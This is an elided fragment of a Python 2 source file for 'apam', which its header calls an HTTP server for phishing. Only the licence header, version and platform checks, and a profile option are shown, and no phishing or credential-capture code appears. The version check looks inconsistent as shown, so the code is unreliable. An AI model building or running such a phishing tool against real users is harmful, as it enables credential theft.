#!/usr/bin/env python2
#
# apam.py - HTTP server for phishing
#
#  apam is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#
#  apam is distributed in the hope that it will be useful,
...
def tests_pyver():
    if sys.version[:3] == "2.7" or "2" in sys.version[:3]:
        ...
        printt(1,"apam has no support for Python 3.")
    else:
        printt(1, "Your Python version is very old ..")

def tests_platform():
    if "linux" in sys.platform:
        #printt(3, "Running apam on linux ... (All good)")
        pass
    elif "darwin" in sys.platform:
        #printt(3, "Running apam on \'Mac\' (All good)")
        pass
    elif "win" in sys.platform:
        print("Sorry, there is no support for windows right now.")
        sys.exit(1)
    else:
        printt(3, "If \'apam\' runs sucsessfuly on your platform %s\nPlease let me (@Hypsurus) know!" %sys.platform)
...
def main():
    ...
    parser.add_option("-p", "--profile", dest="profile", help="Load apam profile.")
